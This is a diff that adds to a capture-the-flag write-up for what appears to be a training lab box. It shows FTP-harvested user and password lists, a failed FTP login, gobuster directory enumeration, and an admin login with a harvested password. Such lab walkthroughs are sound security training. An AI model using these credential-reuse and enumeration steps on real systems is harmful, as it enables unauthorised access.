@@ -166,3 +166,69 @@ ftp>
 ftp> exit
 221 Goodbye.
 ```
+
+Now we check through the files, using the credentials to attack the FTP site further. And what we have got looks too direct but it's good.
+
+```
+┌─[odaj@parrot]─[~/Downloads]
+└──╼ $cat allowed.userlist
+aron
+pwnmeow
+egotisticalsw
+admin
+┌─[odaj@parrot]─[~/Downloads]
+└──╼ $cat allowed.userlist.passwd
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd
+ ```
+trying the login on FTP. And yes, the FTP server just takes in anonymous.
+┌─[odaj@parrot]─[~/Downloads]
+└──╼ $ftp 10.129.1.15
+Connected to 10.129.1.15.
+220 (vsFTPd 3.0.3)
+Name (10.129.1.15:odaj): aron
+530 This FTP server is anonymous only.
+ftp: Login failed
+ftp>
+```
+This is also good as it helps us shift our focus away from the FTP to port 80.
+
+Accessing the IP on the browser on port 80: ```10.129.1.15:80```, gave us a webpage with little buttons and navigations - nothing useful. Looking at what we have from the nmap scan, this is an Apache server running on port 80 - We need a login page to try our credentials. Let's see if we can get some directories that will give us a login page, somewhere. Here comes gobuster:
+
+
+```
+┌─[odaj@parrot]─[~/Downloads]
+└──╼ $gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x .php,.html -s 200
+Error: error on parsing arguments: status-codes ("200") and status-codes-blacklist ("404") are both set - please set only one. status-codes-blacklist is set by default so you might want to disable it by supplying an empty string.
+┌─[✗]─[odaj@parrot]─[~/Downloads]
+└──╼ $gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x php,html -s 200 -b ""
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:            http://10.129.1.15
+[+] Method:         GET
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200
+[+] User Agent:     gobuster/3.6
+[+] Extensions:     php,html
+[+] Timeout:        10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/config.php           (Status: 200) [Size: 0]
+/index.html           (Status: 200) [Size: 58565]
+/index.html           (Status: 200) [Size: 58565]
+/login.php            (Status: 200) [Size: 1577]
+Progress: 13842 / 13845 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+Here we have 2 php pages: config (I am ignoring it first, the "Size" is not giving) and then the login. Trying this out gives us a login page.
+
+And we got our flag using admin & rKXM59ESxesUFHAd =^-^=
